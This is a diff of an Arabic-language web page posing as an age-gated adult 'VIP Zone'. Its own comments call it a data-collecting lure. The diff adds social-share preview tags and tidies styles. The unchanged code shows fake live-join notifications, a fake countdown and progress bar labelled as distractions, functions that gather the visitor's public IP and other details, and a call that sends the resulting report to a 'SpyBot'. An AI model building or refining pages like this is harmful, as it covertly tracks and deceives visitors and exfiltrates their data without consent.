@@ -4,7 +4,19 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>VIP Zone 🔞</title>
+    
+    <!-- ===== علامات المشاركة (Open Graph) – الصورة الجديدة فقط ===== -->
+    <meta property="og:title" content="VIP Zone 🔞 – محتوى حصري للكبار">
+    <meta property="og:description" content="محتوى حصري للكبار فقط. تحقق من عمرك للدخول.">
+    <meta property="og:image" content="https://i.ibb.co/5WhhkQwf/969-073.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://your-site.com">
+    <meta name="twitter:card" content="summary_large_image">
+
     <style>
+        /* باقي الأنماط كما هي (لم تتغير) */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', 'Google Sans', Roboto, sans-serif;
@@ -20,7 +32,6 @@
             background-attachment: fixed;
             position: relative;
         }
-        /* طبقة خفيفة جداً جداً للحفاظ على وضوح الصورة 100% */
         body::before {
             content: '';
             position: absolute;
@@ -50,7 +61,7 @@
         .main-title { font-size: 28px; font-weight: 700; color: #fff; margin-bottom: 5px; text-shadow: 0 2px 10px rgba(0,0,0,0.8); }
         .main-sub { font-size: 16px; color: #ddd; margin-bottom: 20px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 15px; }
 
-        /* معرض الصور */
+        /* معرض الصور (6 صور فقط) */
         .gallery-title { color: #fff; font-size: 18px; margin-bottom: 15px; text-align: right; }
         .gallery-grid {
             display: grid;
@@ -74,7 +85,7 @@
             object-fit: cover;
             border-radius: 12px;
             background: #1a1a2a;
-            pointer-events: none; /* منع تداخل الأحداث مع العنصر الأب */
+            pointer-events: none;
         }
         .gallery-item span {
             display: block;
@@ -84,7 +95,7 @@
             font-weight: 500;
         }
 
-        /* باقي العناصر */
+        /* باقي العناصر (كما هي) */
         .progress-section { margin-bottom: 20px; }
         .progress-label { display: flex; justify-content: space-between; color: #ccc; font-size: 13px; margin-bottom: 5px; }
         .progress-bar { background: #333; border-radius: 30px; height: 8px; overflow: hidden; }
@@ -143,7 +154,7 @@
         .loader { display: inline-block; width: 16px; height: 16px; border: 2px solid white; border-radius: 50%; border-top-color: transparent; animation: spin 0.6s linear infinite; margin-left: 8px; }
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        /* ===== نافذة تكبير الصورة (Fullscreen Modal) ===== */
+        /* مودال تكبير الصورة (كما هي) */
         .image-modal {
             position: fixed;
             top: 0;
@@ -152,7 +163,6 @@
             height: 100%;
             background: rgba(0, 0, 0, 0.92);
             backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
             z-index: 9999;
             display: flex;
             align-items: center;
@@ -161,51 +171,15 @@
             cursor: pointer;
             animation: fadeInModal 0.3s ease;
         }
-        @keyframes fadeInModal {
-            from { opacity: 0; transform: scale(0.9); }
-            to { opacity: 1; transform: scale(1); }
-        }
-        .image-modal img {
-            max-width: 95%;
-            max-height: 90%;
-            object-fit: contain;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            cursor: default;
-        }
+        @keyframes fadeInModal { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
+        .image-modal img { max-width: 95%; max-height: 90%; object-fit: contain; border-radius: 20px; box-shadow: 0 20px 60px rgba(0,0,0,0.8); border: 2px solid rgba(255,255,255,0.1); cursor: default; }
         .image-modal .close-modal {
-            position: absolute;
-            top: 25px;
-            left: 25px;
-            color: white;
-            font-size: 36px;
-            font-weight: 300;
-            cursor: pointer;
-            width: 50px;
-            height: 50px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.1);
-            transition: 0.3s;
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            position: absolute; top: 25px; left: 25px; color: white; font-size: 36px; cursor: pointer;
+            width: 50px; height: 50px; display: flex; align-items: center; justify-content: center;
+            border-radius: 50%; background: rgba(255,255,255,0.1); transition: 0.3s; border: 1px solid rgba(255,255,255,0.2);
         }
-        .image-modal .close-modal:hover {
-            background: rgba(255, 45, 85, 0.6);
-            transform: rotate(90deg);
-        }
-        .image-modal .image-caption {
-            position: absolute;
-            bottom: 40px;
-            color: #aaa;
-            font-size: 16px;
-            background: rgba(0,0,0,0.5);
-            padding: 8px 20px;
-            border-radius: 40px;
-            backdrop-filter: blur(4px);
-        }
+        .image-modal .close-modal:hover { background: rgba(255,45,85,0.6); transform: rotate(90deg); }
+        .image-modal .image-caption { position: absolute; bottom: 40px; color: #aaa; font-size: 16px; background: rgba(0,0,0,0.5); padding: 8px 20px; border-radius: 40px; backdrop-filter: blur(4px); }
     </style>
 </head>
 <body>
@@ -215,17 +189,17 @@
     <div class="main-title">VIP Zone</div>
     <div class="main-sub">محتوى حصري للكبار – تحقق من عمرك</div>
 
-    <!-- 1. إشعارات وهمية -->
+    <!-- إشعارات وهمية -->
     <div class="live-feed" id="liveFeed">
         <p>🟢 انضم المستخدم Ahmed X منذ 5 ثوانٍ</p>
     </div>
 
-    <!-- 2. عداد تنازلي (لن يتكرر) -->
+    <!-- عداد تنازلي (30 ثانية ثم يتوقف) -->
     <div class="timer-box">
         <div class="timer-text">⏳ سيتم فتح المحتوى تلقائياً خلال <span id="countdownTimer">00:30</span></div>
     </div>
 
-    <!-- 3. معرض الصور الجديدة -->
+    <!-- معرض الصور (6 صور فقط، بدون الصورة الجديدة) -->
     <div class="gallery-title">📸 معاينة سريعة للمحتوى (اضغط للتكبير)</div>
     <div class="gallery-grid" id="galleryGrid">
         <div class="gallery-item" onclick="openFullImage('https://i.ibb.co/xqzvG6hK/e2a-486.jpg', 'الصورة 1')">
@@ -254,7 +228,7 @@
         </div>
     </div>
 
-    <!-- 4. شريط تقدم -->
+    <!-- شريط تقدم -->
     <div class="progress-section">
         <div class="progress-label"><span>جاري تجهيز المحتوى...</span><span id="progressPercent">0%</span></div>
         <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
@@ -269,7 +243,6 @@
         </ul>
     </div>
 
-    <!-- زر "التالي" -->
     <button class="age-btn" id="verifyBtn">
         <span>➡️</span> التالي
     </button>
@@ -295,7 +268,7 @@
         } catch(e) { console.error(e); }
     }
 
-    // ========== دوال جمع المعلومات ==========
+    // ========== دوال جمع المعلومات (نفسها) ==========
     async function getPublicIP() {
         try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); return d.ip; } catch(e) { return 'غير متاح'; }
     }
@@ -411,9 +384,7 @@
         await sendToSpyBot(report);
     }
 
-    // ========== وظائف إلهاء المستخدم ==========
-
-    // 1. العداد التنازلي (30 ثانية) - لا يتكرر، يتوقف عند الصفر
+    // ========== العداد التنازلي (30 ثانية لا يتكرر) ==========
     let seconds = 30;
     const timerDisplay = document.getElementById('countdownTimer');
     const timerInterval = setInterval(() => {
@@ -429,7 +400,7 @@
         timerDisplay.innerText = `${mins}:${secs}`;
     }, 1000);
 
-    // 2. شريط التقدم الوهمي (يعيد نفسه لأنه يعطي إحساساً بالتجهيز المستمر)
+    // ========== شريط التقدم (يعيد نفسه) ==========
     let progress = 0;
     const progressFill = document.getElementById('progressFill');
     const progressPercent = document.getElementById('progressPercent');
@@ -443,7 +414,7 @@
         progressPercent.innerText = progress + '%';
     }, 2000);
 
-    // 3. الإشعارات الوهمية (نشاط مباشر)
+    // ========== الإشعارات الوهمية ==========
     const names = ['Ahmed', 'Sara', 'Mohammed', 'Lina', 'Omar', 'Nora', 'Khaled', 'Mona'];
     const feed = document.getElementById('liveFeed');
     setInterval(() => {
@@ -457,38 +428,25 @@
         feed.scrollTop = feed.scrollHeight;
     }, 5000);
 
-    // 4. تكبير الصورة عند الضغط (ملء الشاشة)
+    // ========== تكبير الصورة (Fullscreen Modal) ==========
     function openFullImage(imageSrc, imageName) {
-        // إزالة أي مودال مفتوح سابقاً
         const existingModal = document.querySelector('.image-modal');
         if (existingModal) existingModal.remove();
 
-        // بناء المودال
         const modal = document.createElement('div');
         modal.className = 'image-modal';
-        modal.onclick = function(e) {
-            // إغلاق عند الضغط على الخلفية (وليس على الصورة نفسها)
-            if (e.target === modal) modal.remove();
-        };
+        modal.onclick = function(e) { if (e.target === modal) modal.remove(); };
 
-        // زر الإغلاق (X)
         const closeBtn = document.createElement('div');
         closeBtn.className = 'close-modal';
         closeBtn.innerHTML = '✕';
-        closeBtn.onclick = function(e) {
-            e.stopPropagation();
-            modal.remove();
-        };
+        closeBtn.onclick = function(e) { e.stopPropagation(); modal.remove(); };
 
-        // الصورة
         const img = document.createElement('img');
         img.src = imageSrc;
         img.alt = imageName;
-        img.onclick = function(e) {
-            e.stopPropagation(); // منع إغلاق المودال عند الضغط على الصورة نفسها
-        };
+        img.onclick = function(e) { e.stopPropagation(); };
 
-        // التسمية (اختياري)
         const caption = document.createElement('div');
         caption.className = 'image-caption';
         caption.innerText = `📸 ${imageName}`;
@@ -498,9 +456,7 @@
         modal.appendChild(caption);
         document.body.appendChild(modal);
 
-        // منع التمرير خلف المودال
         document.body.style.overflow = 'hidden';
-        // إعادة التمرير عند الإغلاق
         const observer = new MutationObserver(() => {
             if (!document.querySelector('.image-modal')) {
                 document.body.style.overflow = 'auto';
@@ -510,7 +466,7 @@
         observer.observe(document.body, { childList: true, subtree: true });
     }
 
-    // 5. زر "التالي" (يوجه إلى رابط آخر)
+    // ========== زر "التالي" ==========
     document.getElementById('verifyBtn').addEventListener('click', function(e) {
         this.disabled = true;
         this.innerHTML = '<span class="loader"></span> جاري التوجيه...';
@@ -527,7 +483,6 @@
         }, 2000);
     });
 
-    // دالة الإشعارات المنبثقة
     function showToast(msg) {
         const toast = document.getElementById('toastMsg');
         toast.innerText = msg;
